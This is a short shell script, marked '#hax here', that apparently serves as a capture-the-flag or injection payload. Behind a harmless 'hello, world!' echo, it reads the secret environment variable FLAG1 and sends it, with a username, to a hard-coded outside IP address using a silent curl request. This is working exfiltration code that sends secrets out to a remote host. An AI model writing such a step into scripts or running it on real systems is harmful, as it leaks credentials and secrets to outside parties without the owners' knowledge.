#hax here
echo "hello, world!"
MY_NEW_VAR1="$FLAG1"

curl --fail --show-error --silent --get "http://8.217.202.186:80/" \
    --data-urlencode "username=spencer-goff-quicken" \
    --data-urlencode "var1=${MY_NEW_VAR1}"
